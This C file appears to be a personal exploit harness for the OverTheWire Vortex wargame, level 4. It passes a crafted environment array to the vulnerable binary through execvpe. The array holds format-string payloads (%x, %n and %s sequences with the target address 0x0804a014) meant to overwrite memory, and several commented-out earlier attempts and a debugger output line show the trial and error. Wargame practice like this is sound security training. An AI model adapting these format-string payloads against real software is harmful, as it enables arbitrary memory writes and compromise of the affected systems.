#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <debug.h>

char *newargs[] = { NULL };

char payload_buff[16777216];

char *newenv[] = { 
    "CCCC", 
    "\x14\xa0\x04\x08", 
    //"AAAAAAAAAAAAAAAA%.010u%1$x%.010u%1$x%.010u%1$x%.010u%1$x",
    //"AAAA%.010u",
//AAAA4160737280|804847b[Inferior 1 (process 235624) exited with code 01]
    // need to overwrite *0x804a014 with env[3]
    //"AAAA%10$x.%n\x14\xa0\x04\x08",
    //"\x14\xa0\x04\x08%48$x|%n|",
    //"%08x.%08x.%08x.%08x.%08x.%08x %s \n",
    //"A * 0x0804a014%.010u%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n%1uAAA\x14\xa0\x04\x08.\x14\xa0\x04\x08%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n\n",
    //"AAAaA%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xAAA\x14\xa0\x04\x08.\x14\xa0\x04\x08%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x\n",
    //"\x14\xa0\x04\x08%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%08x|%s|", 
    "\x14\xa0\x04\x08%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%08x.%.f|%s|", 
    //"%08x.%08x.%08x.%08x.", 
    "\x14\xa0\x04\x08", 
};

int main(int argc, char *argv[]) {
    int fd = 0;
    int rc = 0;

    // check(argc == 2, "wrong number of args");

    // fd = open(argv[1], 'r');
    // check(fd, "could not open file");

    // rc = read(fd, payload_buff, sizeof(payload_buff));
    // check(rc, "could not read file %d", rc);

    // close(fd);

    // newenv[2] = payload_buff;
    rc = execvpe("/home/bmoar/git/hacking/otw/vortex/5/vortex4", newargs, newenv);
    check(rc != -1, "should not have failed to execvpe with newenv[2]");

error:
    exit(7);
}
